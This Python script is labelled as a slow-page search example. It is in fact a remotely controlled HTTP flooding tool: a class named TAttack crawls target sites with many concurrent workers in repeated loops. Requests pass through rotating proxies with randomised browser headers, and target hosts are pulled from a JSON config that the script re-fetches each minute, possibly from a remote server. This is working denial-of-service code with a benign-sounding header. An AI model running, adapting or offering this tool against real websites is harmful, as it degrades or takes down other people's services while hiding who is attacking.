'''
Python async
Search slow pages example
VladVons@gmail.com
2022.02.16
'''

import time
import random
import asyncio
import aiohttp
import json
import os
from optparse import OptionParser
from datetime import datetime
from urllib.parse import urlparse
from aiohttp_socks import ProxyConnector
from bs4 import BeautifulSoup


class TLog():
    def __init__(self, aFile):
        self.File = aFile

    def Print(self, aMsg: str):
        Msg = '%s, %s' % (datetime.now().strftime('%H:%M:%S'), aMsg)
        print(Msg)

        with open(self.File, 'a+') as FileH:
            FileH.write(aMsg + '\n')


class TDownload():
    def __init__(self, aProxies: list = []):
        self.Proxies = aProxies

    async def Get(self, aUrl: str) -> tuple:
        async with aiohttp.ClientSession(connector=self._GetConnector()) as Session:
            TimeStart = time.time()
            async with Session.get(aUrl, headers=self._GetHeaders()) as Response:
                Data = await Response.read()
                return (Data, Response.status, round(time.time() - TimeStart, 4))

    def _GetConnector(self) -> ProxyConnector:
        if (self.Proxies):
            return ProxyConnector.from_url(random.choice(self.Proxies))

    @staticmethod
    def _GetHeaders() -> dict:
        OSs = ['Macintosh; Intel Mac OS X 10_15_5', 'Windows NT 10.0; Win64; x64; rv:77', 'Linux; Intel Ubuntu 20.04']
        Browsers = ['Chrome/83', 'Firefox/77', 'Opera/45']

        return {
            'Accept': '*/*',
            'User-Agent': 'Mozilla/5.0 (%s) %s' % (random.choice(OSs), random.choice(Browsers))
        }


class TAttack():
    def __init__(self, aParent, aUrlRoot: str):
        self.Parent = aParent
        self.UrlRoot = aUrlRoot

        self.Sleep = Sked.ConfOption.get('Sleep', 4)
        self.Timeout = 30

        LogFile = '%s/inf_%s.log' % (Sked.ConfOption.get('LogDir', '.'), urlparse(self.UrlRoot).hostname)
        self.Log = TLog(LogFile)

        self.Urls = []
        self.TotalData = 0
        self.UrlDone = 0
        self.IsRun = False

        self.Queue = asyncio.Queue()
        self.Queue.put_nowait(aUrlRoot)

        self.Event = asyncio.Event()
        self.Wait(False)

    @staticmethod
    def IsMimeApp(aUrl: str) -> bool: 
        Path = urlparse(aUrl).path
        Ext = os.path.splitext(Path)[1]
        return Ext in ['.zip', '.rar', '.xml', '.pdf', '.jpg', '.jpeg', '.png', '.gif']

    async def _GrabHref(self, aUrl: str, aData: str, aStatus: int, aTaskId: int, aDuration: float):
        UrlSize = len(aData)
        self.TotalData += UrlSize
        self.UrlDone += 1

        Soup = BeautifulSoup(aData, "lxml")
        for A in Soup.find_all("a"):
            Href = A.get("href", '').strip().rstrip('/')
            if (Href):
                if (Href.startswith('/')):
                    Href = self.UrlRoot + Href

                if (Href.startswith(self.UrlRoot)) and \
                    (not Href.startswith('#')) and \
                    (not self.IsMimeApp(Href)) and \
                    (not Href in self.Urls):
                    self.Urls.append(Href)
                    self.Queue.put_nowait(Href)
        Msg = 'task:%4d, status:%d, found:%5d, done:%5d, total:%5dM, size:%5dK, time:%7.3f, %s' % \
              (aTaskId, aStatus, len(self.Urls), self.UrlDone, self.TotalData/1000000, UrlSize/1000, aDuration, aUrl)
        self.Log.Print(Msg)

    async def _Worker(self, aTaskId: int):
        #await asyncio.sleep(aTaskId)
        TimeStart = time.time()
        Download = TDownload(Sked.Conf.get('Proxies'))

        self.IsRun = True
        while (self.IsRun):
            await self.Event.wait()
            await asyncio.sleep(self.Sleep)

            if (self.Queue.empty()) and (time.time() - TimeStart > self.Timeout):
                break

            try:
                Url = await asyncio.wait_for(self.Queue.get(), timeout = self.Timeout)
                Arr = await Download.Get(Url)
                if (Arr):
                    Data, Status, Time = Arr
                    if (Status == 200):
                        await self._GrabHref(Url, Data, Status, aTaskId, Time)
            except (aiohttp.ClientConnectorError, aiohttp.ClientError) as E:
                self.Log.Print('Err:%s, %s' % (Url, E))
            except asyncio.TimeoutError:
                self.Log.Print('Err:%s, queue timeout %d' % (self.UrlRoot, self.Timeout))
            except Exception as E:
                self.Log.Print('Err:%s, %s'% (Url, E))
            finally:
                self.Queue.task_done()

        self.Log.Print('Done %s, task %d' % (self.UrlRoot, aTaskId))

    def Wait(self, aEnable: bool):
        if (aEnable):
            self.Event.clear()
        else:
            self.Event.set()

    async def Run(self, aMaxTasks: int, aLoops: int = 1):
        for i in range(aLoops):
            self.Log.Print('Start %s, loop %d' % (self.UrlRoot, i))
            Tasks = [asyncio.create_task(self._Worker(i)) for i in range(aMaxTasks)]
            await asyncio.gather(*Tasks)
            self.IsRun = False
            self.Log.Print('Done %s, loop %d' % (self.UrlRoot, i))
            asyncio.sleep(1)


class TSked():
    def __init__(self, aPath: str):
        self.Path = aPath

        self.Conf = {}
        self.ConfOption = {}
        self.Download = TDownload()

    async def AsUrl(self) -> dict:
        Arr = await self.Download.Get(self.Path)
        if (Arr):
            return self._Check(Arr[0].decode())

    def AsFile(self) -> dict:
       with open(self.Path, 'r') as hFile:
            return self._Check(hFile.read())

    async def Load(self):
        if (os.path.exists(self.Path)):
            Res = self.AsFile()
        else:
            Res = await self.AsUrl()
        return Res

    def _Check(self, aData: str) -> bool:
        if (aData):
            Data = json.loads(aData)
            if (self.Conf != Data):
                self.Conf = Data
                self.ConfOption = Data.get('Option', {})
                self.Download.Proxies = Data.get('Proxies', [])
                return True

    async def ShowExtIp(self):
        ExtIpCheck = self.ConfOption.get('ExtIpCheck')
        if (ExtIpCheck):
            Arr = await self.Download.Get(ExtIpCheck)
            print('Sked check', Arr)


class TMain():
    def __init__(self):
        self.Tasks = []
        self.Task_Create = None

    async def Create(self, aUrls: list):
        for Url in aUrls:
            Attack = TAttack(self, Url)
            MaxTasks = Sked.ConfOption.get('MaxTasks', 5)
            MaxLoops = Sked.ConfOption.get('MaxLoops', 1)
            Task = asyncio.create_task(Attack.Run(MaxTasks, MaxLoops))
            self.Tasks.append([Attack, Task])

    def Cancel(self):
        for Attack, Task in self.Tasks:
            Task.cancel()
            del Attack
        self.Tasks = []

    def Wait(self, aEnable: bool):
        for Attack, Task in self.Tasks:
            Attack.Wait(aEnable)

    async def Run(self):
        while (True):
            await Sked.ShowExtIp()

            if (await Sked.Load()):
                print('Sked create')
                self.Wait(not Sked.ConfOption.get('Run', True))

                self.Cancel()
                await asyncio.sleep(1)

                if (self.Task_Create):
                    self.Task_Create.cancel()
                self.Task_Create = asyncio.create_task(self.Create(Sked.Conf['Hosts']))

            await asyncio.sleep(60)


def Main():
    global Sked

    Usage = 'usage: %prog [options]'
    Parser = OptionParser(usage = Usage)
    AppName = os.path.splitext(Parser.get_prog_name())[0]
    Parser.add_option('-c', '--conf',    help = 'config file or url')
    Parser.add_option('-v', '--version', help = 'show version', action = "store_true")

    CmdParam, Args = Parser.parse_args()
    if (CmdParam.version):
        print('Version %s' % ( __version__))

    if (CmdParam.conf is None):
        Parser.print_help()
        return

    #SkedPath = 'http://176.57.68.80/www/temp/attack.json'
    Sked = TSked(CmdParam.conf)
    asyncio.run(TMain().Run())


if (__name__ == '__main__'):
    Main()
